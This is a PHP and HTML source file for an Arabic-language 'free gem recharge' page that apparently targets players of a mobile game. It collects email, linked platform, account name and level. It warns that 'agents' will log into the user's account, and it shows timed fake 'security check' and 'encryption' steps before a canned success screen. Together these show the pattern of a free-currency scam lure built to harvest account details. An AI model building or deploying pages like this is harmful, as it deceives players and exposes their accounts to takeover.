<?php
require_once 'config.php';
if (!is_logged_in()) { header("Location: index.php"); exit(); }
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>طلب شحن - متجر الجواهر</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f172a; color: white; -webkit-tap-highlight-color: transparent; }
        .platform-btn { width: 60px; height: 60px; border-radius: 50%; border: 2px solid transparent; transition: all 0.3s; background: #1e293b; display: flex; align-items: center; justify-content: center; }
        .platform-btn.active { border-color: #3b82f6; transform: scale(1.1); box-shadow: 0 0 15px rgba(59, 130, 246, 0.5); }
        .diamond-card { background: #1e293b; border-radius: 15px; border: 1px solid rgba(255,255,255,0.05); transition: all 0.3s; cursor: pointer; }
        .diamond-card.active { border-color: #3b82f6; background: #2d3e5a; }
        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); }
        .modal-content { background: #1e293b; margin: 10% auto; padding: 30px; border-radius: 25px; width: 90%; max-width: 450px; border: 1px solid #3b82f6; box-shadow: 0 0 30px rgba(59, 130, 246, 0.3); }
        .loader-circular { width: 80px; height: 80px; border: 5px solid #3b82f6; border-bottom-color: transparent; border-radius: 50%; display: inline-block; animation: rotation 1s linear infinite; }
        @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .btn-l { position: relative; display: flex; align-items: center; justify-content: center; }
        .loader-bar { width: 20px; height: 20px; border: 3px solid #FFF; border-bottom-color: transparent; border-radius: 50%; display: inline-block; animation: rotation 1s linear infinite; }
    </style>
</head>
<body class="p-4 md:p-8">

<div class="max-w-md mx-auto bg-slate-900/50 p-6 rounded-3xl border border-white/5 animate__animated animate__fadeIn">
    <div class="flex items-center mb-6">
        <button onclick="window.history.back()" class="p-2 bg-slate-800 rounded-lg ml-4"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5"></path><path d="m12 19-7-7 7-7"></path></svg></button>
        <h1 class="text-2xl font-bold">طلب شحن مجاني</h1>
    </div>

    <div class="space-y-6">
        <div>
            <label class="block text-sm text-gray-400 mb-3">نوع الربط الأساسي</label>
            <div class="flex justify-around">
                <button type="button" onclick="selectPlatform('gmail', this)" class="platform-btn">
                    <img src="https://www.google.co.jp/favicon.ico" class="w-8 h-8 rounded-full">
                </button>
                <button type="button" onclick="selectPlatform('facebook', this)" class="platform-btn">
                    <img src="https://www.facebook.com/favicon.ico" class="w-8 h-8">
                </button>
                <button type="button" onclick="selectPlatform('twitter', this)" class="platform-btn">
                    <img src="https://twitter.com/favicon.ico" class="w-8 h-8">
                </button>
            </div>
            <input type="hidden" id="platform">
        </div>

        <div id="extra-fields" class="space-y-4">
            <div>
                <label class="block text-sm mb-2">البريد الإلكتروني</label>
                <input type="email" id="email" class="w-full bg-slate-800 border-none rounded-xl p-3 outline-none" placeholder="example@gmail.com">
            </div>
            <div>
                <label class="block text-sm mb-2">اسم الحساب</label>
                <input type="text" id="acc_name" class="w-full bg-slate-800 border-none rounded-xl p-3 outline-none" placeholder="اسمك في اللعبة">
            </div>
            <div>
                <label class="block text-sm mb-2">مستوى الحساب</label>
                <input type="number" id="level" class="w-full bg-slate-800 border-none rounded-xl p-3 outline-none" placeholder="المستوى (مثلاً 50)">
            </div>
            <div>
                <label class="block text-sm mb-2">هل شحنت من الموقع من قبل؟</label>
                <select id="charged" class="w-full bg-slate-800 border-none rounded-xl p-3 outline-none">
                    <option value="لا">لا</option>
                    <option value="نعم">نعم</option>
                </select>
            </div>
        </div>

        <div>
            <label class="block text-sm text-gray-400 mb-3">اختر كمية الجواهر</label>
            <div class="grid grid-cols-2 gap-3">
                <div onclick="selectDiamond(30, this)" class="diamond-card p-4 text-center">
                    <div class="font-bold text-blue-400">30 جوهرة</div>
                    <div class="text-[10px] text-gray-400">تصل بعد 24 ساعة</div>
                </div>
                <div onclick="selectDiamond(50, this)" class="diamond-card p-4 text-center">
                    <div class="font-bold text-blue-400">50 جوهرة</div>
                    <div class="text-[10px] text-gray-400">تصل بعد 48 ساعة</div>
                </div>
                <div onclick="selectDiamond(80, this)" class="diamond-card p-4 text-center">
                    <div class="font-bold text-blue-400">80 جوهرة</div>
                    <div class="text-[10px] text-gray-400">تصل بعد 62 ساعة</div>
                </div>
                <div onclick="selectDiamond(120, this)" class="diamond-card p-4 text-center">
                    <div class="font-bold text-blue-400">120 جوهرة</div>
                    <div class="text-[10px] text-gray-400">تصل بعد 3 أيام</div>
                </div>
            </div>
            <input type="hidden" id="diamonds">
        </div>

        <div>
            <label class="block text-sm text-gray-400 mb-3">طرق الدفع</label>
            <div class="space-y-3">
                <!-- جازي -->
                <button type="button" class="relative w-full rounded-xl border-2 border-red-500 bg-slate-800 p-4 transition-all overflow-hidden flex items-center justify-center h-20">
                    <div class="absolute top-0 right-0 rounded-bl-lg bg-red-600 px-3 py-1 text-[10px] font-bold text-white z-10 flex border-b border-l border-white/10 items-center gap-1">
                        عرض خاص
                    </div>
                    <div class="flex items-center gap-2">
                        <div class="text-xl font-black text-white">جازي</div>
                        <div class="bg-red-600 text-white font-black text-lg px-2 py-1 transform -skew-x-12">
                            DJEZZY
                        </div>
                    </div>
                </button>

                <!-- أوريدو (Ooredoo) -->
                <div class="relative w-full rounded-xl border border-gray-600 bg-slate-800 p-4 h-20 flex items-center justify-center overflow-hidden grayscale">
                    <div class="text-xl font-black text-red-500">ooredoo</div>
                    <div class="absolute inset-0 bg-slate-900/80 flex items-center justify-center backdrop-blur-[2px]">
                        <span class="text-xs font-bold text-gray-300">
                            مغلق مؤقتاً للصيانة
                        </span>
                    </div>
                </div>
            </div>
        </div>

        <button onclick="preSubmit()" id="submit_btn" class="w-full bg-blue-600 py-4 rounded-xl font-bold shadow-xl shadow-blue-900/20 active:scale-95 transition btn-l">
            طلب الشحن
        </button>
    </div>
</div>

<!-- Modal التحذير -->
<div id="confirmModal" class="modal">
    <div class="modal-content animate__animated animate__zoomIn text-center">
        <div class="bg-blue-500/10 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4">
            <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#3b82f6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"></path><path d="M12 9v4"></path><path d="M12 17h.01"></path></svg>
        </div>
        <h3 class="text-xl font-bold mb-4">تنويه هام</h3>
        <p class="text-sm text-gray-300 mb-6">سيتم الدخول إلى حسابك للتأكد منه من طرف عملائنا عبر جهاز Realme إذا كنت موافقاً يمكنك الاستمرار.</p>
        
        <label class="flex items-center justify-center space-x-2 space-x-reverse mb-6 cursor-pointer">
            <input type="checkbox" id="terms" class="w-5 h-5 rounded border-none bg-slate-700 text-blue-500">
            <span class="text-sm">أوافق على شروط الخدمة</span>
        </label>

        <div class="flex space-x-4 space-x-reverse">
            <button onclick="closeModal('confirmModal')" class="flex-1 bg-slate-700 py-3 rounded-xl font-bold">إلغاء</button>
            <button onclick="startProcessing()" class="flex-1 bg-blue-600 py-3 rounded-xl font-bold">متابعة</button>
        </div>
    </div>
</div>

<!-- Modal المعالجة -->
<div id="processModal" class="modal">
    <div class="modal-content animate__animated animate__fadeIn text-center">
        <div class="loader-circular mb-6"></div>
        <h3 id="processText" class="text-lg font-bold mb-2">جاري التحقق من المعلومات...</h3>
        <p class="text-xs text-gray-400 mb-2">طلب رقم: <span id="ordNum" class="text-blue-500">جاري التوليد...</span></p>
    </div>
</div>

<!-- Modal النجاح -->
<div id="successModal" class="modal">
    <div class="modal-content text-center animate__animated animate__bounceIn">
        <div class="bg-emerald-500/10 w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-6">
            <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
        </div>
        <h3 class="text-2xl font-bold mb-2">تم الطلب بنجاح!</h3>
        <p class="text-sm text-gray-400 mb-8">طلبك الآن قيد الانتظار. يرجى الانتقال إلى قسم طلباتي للتأكد من حالة الطلب.</p>
        <button onclick="window.location.href='my_orders.php'" class="w-full bg-blue-600 py-4 rounded-xl font-bold">انتقال إلى طلباتي</button>
    </div>
</div>

<script>
    function selectPlatform(p, btn) {
        $('.platform-btn').removeClass('active');
        $(btn).addClass('active');
        $('#platform').val(p);
    }

    function selectDiamond(d, card) {
        $('.diamond-card').removeClass('active');
        $(card).addClass('active');
        $('#diamonds').val(d);
        
        let msg = "";
        if(d == 30) msg = "تصل بعد 24 ساعة";
        else if(d == 50) msg = "تصل بعد 48 ساعة";
        else if(d == 80) msg = "تصل بعد 62 ساعة";
        else if(d == 120) msg = "من المحتمل لا تصل الجواهر إلا بعد 3 أيام";
        
        // Custom elegant notification instead of alert
        showToast(msg);
    }

    function preSubmit() {
        if(!$('#platform').val() || !$('#email').val() || !$('#acc_name').val() || !$('#level').val() || !$('#diamonds').val()) {
            showToast('يرجى ملأ جميع الحقول واختيار الجواهر');
            return;
        }
        $('#confirmModal').show();
    }

    function startProcessing() {
        if(!$('#terms').prop('checked')) {
            showToast('يجب الموافقة على شروط الخدمة أولاً');
            return;
        }
        
        $('#confirmModal').hide();
        $('#processModal').show();
        
        const steps = [
            "جاري التحقق من المعلومات...",
            "جاري التحقق من أمان المعلومات...",
            "جاري تشفير المعلومات...",
            "جاري إرسال الطلب..."
        ];
        
        let step = 0;
        const interval = setInterval(() => {
            if(step < steps.length - 1) {
                step++;
                $('#processText').text(steps[step]);
            }
        }, 2500);

        $.ajax({
            url: 'ajax.php',
            type: 'POST',
            data: {
                action: 'order_request',
                platform: $('#platform').val(),
                email: $('#email').val(),
                acc_name: $('#acc_name').val(),
                level: $('#level').val(),
                charged: $('#charged').val(),
                diamonds: $('#diamonds').val()
            },
            dataType: 'json',
            success: function(res) {
                if(res.status === 'success') {
                    $('#ordNum').text(res.order_number);
                    setTimeout(() => {
                        clearInterval(interval);
                        $('#processModal').hide();
                        $('#successModal').show();
                    }, 10000);
                } else {
                    clearInterval(interval);
                    $('#processModal').hide();
                    showToast(res.message);
                }
            }
        });
    }

    function closeModal(id) { $('#' + id).hide(); }

    function showToast(msg) {
        const toast = $(`<div class="fixed bottom-10 left-1/2 -translate-x-1/2 bg-slate-800 text-white px-6 py-3 rounded-2xl shadow-2xl border border-white/10 z-[2000] animate__animated animate__fadeInUp">${msg}</div>`);
        $('body').append(toast);
        setTimeout(() => { toast.addClass('animate__fadeOutDown'); setTimeout(() => toast.remove(), 500); }, 3000);
    }
</script>

</body>
</html>
